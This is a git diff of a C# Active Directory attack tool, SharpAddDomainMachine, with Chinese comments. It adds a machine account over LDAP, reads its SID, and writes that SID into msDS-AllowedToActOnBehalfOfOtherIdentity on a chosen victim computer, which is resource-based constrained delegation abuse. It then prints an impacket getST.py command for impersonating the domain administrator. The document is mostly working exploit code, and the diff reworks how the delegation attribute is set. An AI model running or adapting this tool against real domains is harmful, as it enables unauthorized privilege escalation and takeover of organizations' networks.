@@ -5,6 +5,7 @@ using System.Security.Principal;
 using System.Net;
 using System.Collections.Generic;
 using System.Linq;
+using System.DirectoryServices.Protocols;
 
 namespace SharpAddDomainMachine
 {
@@ -91,7 +92,7 @@ namespace SharpAddDomainMachine
                 distinguished_name += ",DC=" + DC;
                 victim_distinguished_name += ",DC=" + DC;
             }
-
+            Console.WriteLine(victim_distinguished_name);
             Console.WriteLine("[+] Elevate permissions on " + victimcomputer);
             Console.WriteLine("[+] Domain = " + Domain);
             Console.WriteLine("[+] Domain Controller = " + DomainController);
@@ -106,14 +107,6 @@ namespace SharpAddDomainMachine
             connection.SessionOptions.Sealing = true;
             connection.SessionOptions.Signing = true;
             connection.Bind();
-            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
-                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + new_MachineAccount_password + "\"")),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
-                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
-            });
             //通过ldap找计算机
             System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain);
             myldapConnection.Path = "LDAP://" + victim_distinguished_name;
@@ -133,40 +126,48 @@ namespace SharpAddDomainMachine
                 Console.WriteLine(ex.Message + "[-] Exiting...");
                 return;
             }
-            try
-            {
-                //添加机器账户
-                connection.SendRequest(request);
-                Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
-            }
-            catch (System.Exception ex)
-            {
-                Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
-                Console.WriteLine("[-] Exception: " + ex.Message);
-                return;
-            }
-            // 获取新计算机对象的SID
-            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
-            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
-            SecurityIdentifier sid = null;
-            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
+
+            //添加机器并设置资源约束委派
+            if (result != null)
             {
                 try
                 {
-                    sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
-                    Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
+                    var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
+                new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + new_MachineAccount_password + "\"")),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
+                new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
+            });
+                    //添加机器账户
+                    connection.SendRequest(request);
+                    Console.WriteLine("[+] Machine account: " + machine_account + " Password: " + new_MachineAccount_password + " added");
                 }
-                catch
+                catch (System.Exception ex)
                 {
-                    Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                    Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)");
+                    Console.WriteLine("[-] Exception: " + ex.Message);
                     return;
                 }
-            }
-            
-            //设置资源约束委派
-            if (result != null)
-            {
-                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();
+                // 获取新计算机对象的SID
+                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
+                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
+                SecurityIdentifier sid = null;
+                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
+                {
+                    try
+                    {
+                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
+                        Console.Out.WriteLine("[+] " + new_MachineAccount + " SID : " + sid.Value);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
+                        return;
+                    }
+                }
+                //设置资源约束委派
                 String sec_descriptor = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid.Value + ")";
                 RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                 byte[] buffer = new byte[sd.BinaryLength];
@@ -174,17 +175,18 @@ namespace SharpAddDomainMachine
                 //测试sddl转换结果
                 //RawSecurityDescriptor test_back = new RawSecurityDescriptor (buffer, 0);
                 //Console.WriteLine(test_back.GetSddlForm(AccessControlSections.All));
-
-
                 // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
                try
                 {
-                    //entryToUpdate.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = buffer;
-                    entryToUpdate.InvokeSet("msDS-AllowedToActOnBehalfOfOtherIdentity", buffer);
-                    entryToUpdate.CommitChanges();//提交更改
-                    entryToUpdate.Close();
-                    Console.WriteLine("[+] Exploit successfully!");
-
+                    var change_request = new System.DirectoryServices.Protocols.ModifyRequest();
+                    change_request.DistinguishedName = victim_distinguished_name;
+                    DirectoryAttributeModification modifymsDS = new DirectoryAttributeModification();
+                    modifymsDS.Operation = DirectoryAttributeOperation.Replace;
+                    modifymsDS.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity";
+                    modifymsDS.Add(buffer);
+                    change_request.Modifications.Add(modifymsDS);
+                    connection.SendRequest(change_request);
+                    Console.WriteLine("[+] Exploit successfully!\n");
                     //打印利用方式
                     Console.WriteLine("[+] Use impacket to get priv!\n\n[+] Command:\n");
                     Console.WriteLine("\ngetST.py -dc-ip {0} {1}/{2}$:{3} -spn cifs/{4}.{5} -impersonate administrator", DomainController, Domain, machine_account, new_MachineAccount_password, victimcomputer, Domain);
